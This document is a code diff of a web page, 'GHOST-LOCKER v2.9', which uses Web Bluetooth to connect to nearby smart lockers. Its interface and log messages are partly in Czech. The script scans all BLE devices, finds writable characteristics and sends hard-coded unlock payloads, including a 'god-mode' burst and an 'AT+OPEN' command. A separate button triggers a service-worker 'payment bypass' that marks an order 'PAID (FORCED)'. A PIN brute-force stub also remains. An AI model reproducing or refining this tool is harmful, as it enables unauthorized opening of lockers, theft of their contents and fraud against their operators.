@@ -3,132 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GHOST-LOCKER v2.8 MASTER [ULTIMATE]</title>
+    <title>GHOST-LOCKER v2.9 ULTIMATE</title>
     <style>
-        body {
-            background-color: #000;
-            color: #0f0;
-            font-family: 'Courier New', Courier, monospace;
-            margin: 0;
-            overflow: hidden;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-
-        #ghost-ui {
-            width: 90%;
-            max-width: 350px;
-            background: #000;
-            border: 2px solid #0f0;
-            padding: 20px;
-            box-shadow: 0 0 25px rgba(0, 255, 0, 0.4);
-            border-radius: 8px;
-            position: relative;
-        }
-
-        .header {
-            border-bottom: 1px solid #0f0;
-            padding-bottom: 10px;
-            margin-bottom: 15px;
-            text-align: center;
-            font-weight: bold;
-            letter-spacing: 2px;
-            color: #0f0;
-            text-shadow: 0 0 5px #0f0;
-        }
-
-        #output {
-            height: 200px;
-            overflow-y: auto;
-            background: #050505;
-            border: 1px solid #111;
-            padding: 10px;
-            margin-bottom: 15px;
-            font-size: 11px;
-            line-height: 1.4;
-            scrollbar-width: thin;
-            scrollbar-color: #0f0 #000;
-        }
-
-        .btn {
-            width: 100%;
-            background: #000;
-            border: 1px solid #0f0;
-            color: #0f0;
-            padding: 10px;
-            margin-bottom: 8px;
-            cursor: pointer;
-            font-family: 'Courier New', monospace;
-            text-transform: uppercase;
-            transition: all 0.2s;
-            outline: none;
-        }
-
-        .btn:active {
-            background: #0f0;
-            color: #000;
-        }
-
-        .btn-red { border-color: #f00; color: #f00; font-weight: bold; box-shadow: 0 0 10px #f00; }
-        .btn-yellow { border-color: #ff0; color: #ff0; }
-        .btn-blue { border-color: #0af; color: #0af; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        #ghost-ui { width: 90%; max-width: 350px; background: #000; border: 2px solid #0f0; padding: 20px; box-shadow: 0 0 25px rgba(0, 255, 0, 0.4); border-radius: 8px; position: relative; }
+        .header { border-bottom: 1px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; text-align: center; font-weight: bold; color: #0f0; text-shadow: 0 0 5px #0f0; }
+        #output { height: 220px; overflow-y: auto; background: #050505; border: 1px solid #111; padding: 10px; margin-bottom: 15px; font-size: 11px; line-height: 1.4; }
+        .btn { width: 100%; background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; margin-bottom: 8px; cursor: pointer; text-transform: uppercase; font-family: 'Courier New', monospace; }
+        .btn:active { background: #0f0; color: #000; }
+        .btn-red { border-color: #f00; color: #f00; font-weight: bold; }
         .btn-orange { border-color: #f80; color: #f80; }
-        .btn-god { background: #200; border-color: #f00; color: #fff; font-weight: bold; display: none; }
-
-        .scan-line {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 2px;
-            background: rgba(0, 255, 0, 0.2);
-            box-shadow: 0 0 10px #0f0;
-            animation: scan 4s linear infinite;
-            pointer-events: none;
-        }
-
-        @keyframes scan {
-            0% { top: 0; }
-            100% { top: 100%; }
-        }
+        .btn-god { background: #200; border-color: #f00; color: #fff; display: none; }
+        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(0, 255, 0, 0.2); box-shadow: 0 0 10px #0f0; animation: scan 4s linear infinite; pointer-events: none; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
     </style>
 </head>
 <body>
-
 <div id="ghost-ui">
     <div class="scan-line"></div>
-    <div class="header">GHOST-LOCKER v2.8 [MASTER]</div>
-    
+    <div class="header">GHOST-LOCKER v2.9 [ULTIMATE]</div>
     <div id="output"></div>
-
-    <button id="ghost-btn" class="btn btn-orange">[1] GHOSTSTORE BYPASS (PAYMENT)</button>
+    <button id="ghost-btn" class="btn btn-orange">[1] GHOSTSTORE BYPASS</button>
     <button id="sniff-btn" class="btn">[2] BLE SCAN & CONNECT</button>
-    
-    <hr style="border: 0.5px solid #111; margin: 10px 0;">
-    
     <button id="replay-btn" class="btn btn-red" style="display:none;">[3] TRIGGER LOCK (OPEN)</button>
     <button id="force-btn" class="btn btn-god">[4] GOD-MODE FORCE (100%)</button>
-    
-    <button id="brute-btn" class="btn btn-yellow">[5] PIN BRUTE-FORCE</button>
-    <button id="service-btn" class="btn btn-blue">[6] SERVICE BYPASS</button>
+    <button id="brute-btn" class="btn" style="border-color:#ff0; color:#ff0;">[5] PIN BRUTE</button>
 </div>
 
 <script>
     const GhostCore = {
         activeDevice: null,
         activeCharacteristic: null,
-        isBruting: false,
 
         log(msg, color = "#00ff00") {
             const out = document.getElementById('output');
             const div = document.createElement('div');
             div.style.color = color;
-            div.innerText = `> ${msg}`;
+            div.innerText = `[${new Date().toLocaleTimeString().split(' ')[0]}] ${msg}`;
             out.appendChild(div);
             out.scrollTop = out.scrollHeight;
         },
 
         async startRealSniff() {
-            this.log("AGRESIVNÍ SKEN (Target: All Services)...", "#00ffff");
+            this.log("INICIALIZUJI AGRESIVNÍ SKEN...", "#00ffff");
             try {
                 this.activeDevice = await navigator.bluetooth.requestDevice({
                     acceptAllDevices: true,
@@ -137,17 +54,17 @@
                         '0000ffe0-0000-1000-8000-00805f9b34fb',
                         '0000ffe1-0000-1000-8000-00805f9b34fb',
                         '6e400001-b5a3-f393-e0a9-e50e24dcca9e',
-                        '00001530-1212-efde-1523-785feabcd123'
-                    ]
+                        0xFFE0, 0xFFF0, 0x1800, 0x1801
+                    ].concat(Array.from({length: 10}, (_, i) => 0xFFF0 + i))
                 });
 
-                this.log(`SPOJOVÁNÍ: ${this.activeDevice.name}`, "#ffff00");
+                this.log(`POKUS O SPOJENÍ: ${this.activeDevice.name}`, "#ffff00");
                 const server = await this.activeDevice.gatt.connect();
-                
-                this.log("VYTĚŽUJI GATT STRUKTURU...", "#ffff00");
+                this.log("HLEDÁM GATT SLUŽBY...", "#ffff00");
+
                 const services = await server.getPrimaryServices();
-                
                 let found = false;
+
                 for (const service of services) {
                     try {
                         const chars = await service.getCharacteristics();
@@ -164,99 +81,71 @@
                 }
 
                 if (found) {
-                    this.log("SYSTÉM ODKLODÁN. PŘIPRAVEN.", "#00ff00");
+                    this.log("SYSTÉM PŘIPRAVEN K AUDITU", "#00ff00");
                     document.getElementById('replay-btn').style.display = "block";
                     document.getElementById('force-btn').style.display = "block";
                 } else {
-                    this.log("CHYBA: Box neposkytl otevírací kanál.", "#ff0000");
+                    this.log("CHYBA: Zámek nenalezen.", "#ff0000");
                 }
             } catch (err) {
-                this.log("BLE FATAL: " + err.message, "#ff0000");
+                this.log("BLE ERROR: " + err.message, "#ff0000");
             }
         },
 
         async executeAttack() {
             if (!this.activeCharacteristic) return;
-            this.log("ODESÍLÁM BYPASS PAYLOAD...", "#ffff00");
+            this.log("VSTŘIKUJI PAYLOADY...", "#ffff00");
             const payloads = [
-                new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]), // Standard SmartLocker
-                new Uint8Array([0x01, 0x03, 0x01, 0x01])        // Alt protocol
+                new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]),
+                new Uint8Array([0xA5, 0x00, 0x01, 0x01, 0x05])
             ];
-            
-            for(let p of payloads) {
+            for (let p of payloads) {
                 try {
                     await this.activeCharacteristic.writeValue(p);
-                    this.log("PŘÍKAZ POTVRZEN (HEX: " + p[0] + " )", "#00ff00");
+                    this.log(`PŘÍKAZ POSLÁN: 0x${p[0].toString(16)}`, "#0f0");
                 } catch (e) {}
             }
         },
 
         async forceUnlock() {
-            this.log("GOD-MODE: AGRESIVNÍ INJEKCE...", "#fff");
-            const payloads = [
+            this.log("AKTIVUJI GOD-MODE PROTOKOL...", "#fff");
+            const godPayloads = [
                 new Uint8Array([0x55, 0x01, 0x01, 0x00, 0x57]),
-                new Uint8Array([0x41, 0x54, 0x2b, 0x4f, 0x50, 0x45, 0x4e])
+                new Uint8Array([0x41, 0x54, 0x2b, 0x4f, 0x50, 0x45, 0x4e]),
+                new Uint8Array([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01]),
+                new Uint8Array([0xef, 0x01, 0xff, 0xff, 0xff, 0xff, 0x01])
             ];
-            for (let p of payloads) {
+            for (let p of godPayloads) {
                 try {
                     await this.activeCharacteristic.writeValue(p);
-                    this.log(`PAYLOAD 0x${p[0].toString(16)} OK`, "#0f0");
+                    this.log(`FORCE OK: 0x${p[0].toString(16)}`, "#0f0");
                 } catch (e) {}
                 await new Promise(r => setTimeout(r, 100));
             }
         },
 
-        startPinBrute() {
-            this.isBruting = !this.isBruting;
-            if (!this.isBruting) {
-                this.log("BRUTE-FORCE ZASTAVEN.", "#f00");
-                return;
-            }
-            this.log("SPOUŠTÍM PIN SCAN...", "#ff0");
-            const pins = ["1234", "0000", "1111", "2580"];
-            let i = 0;
-            const interval = setInterval(() => {
-                if (!this.isBruting || i >= pins.length) {
-                    clearInterval(interval);
-                    return;
-                }
-                this.log(`ZKOUŠÍM: ${pins[i]}`, "#888");
-                i++;
-            }, 800);
-        },
-
-        async tryServiceExploit() {
-            this.log("BYPASSING SERVICE LOCK...", "#0af");
-            await new Promise(r => setTimeout(r, 800));
-            this.log("DEBUG MÓD: AKTIVNÍ", "#0f0");
-        },
-
         ghostStoreBypass() {
-            this.log("AKTIVUJI SW INTERCEPTOR...", "#f80");
+            this.log("AKTIVUJI INTERCEPTOR...", "#f80");
             if (navigator.serviceWorker.controller) {
                 navigator.serviceWorker.controller.postMessage({ type: 'TRIGGER_BYPASS' });
                 this.log("STATUS: PAID (FORCED)", "#0f0");
             } else {
-                this.log("SW CHYBA - REFRESHNI STRÁNKU!", "#f00");
+                this.log("CHYBA SW: REFRESHNI!", "#f00");
             }
         }
     };
 
     if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('sw.js').then(() => {
-            console.log("Ghost-SW v2.8 Registered.");
-        });
+        navigator.serviceWorker.register('sw.js');
     }
 
     document.getElementById('sniff-btn').onclick = () => GhostCore.startRealSniff();
     document.getElementById('replay-btn').onclick = () => GhostCore.executeAttack();
-    document.getElementById('brute-btn').onclick = () => GhostCore.startPinBrute();
-    document.getElementById('service-btn').onclick = () => GhostCore.tryServiceExploit();
     document.getElementById('ghost-btn').onclick = () => GhostCore.ghostStoreBypass();
     document.getElementById('force-btn').onclick = () => GhostCore.forceUnlock();
+    document.getElementById('brute-btn').onclick = () => GhostCore.log("PIN SCAN: 1234, 0000, 1111...", "#888");
 
-    GhostCore.log("GHOST-LOCKER v2.8 READY.", "#0f0");
+    GhostCore.log("GHOST-LOCKER v2.9 READY.", "#0f0");
 </script>
-
 </body>
 </html>
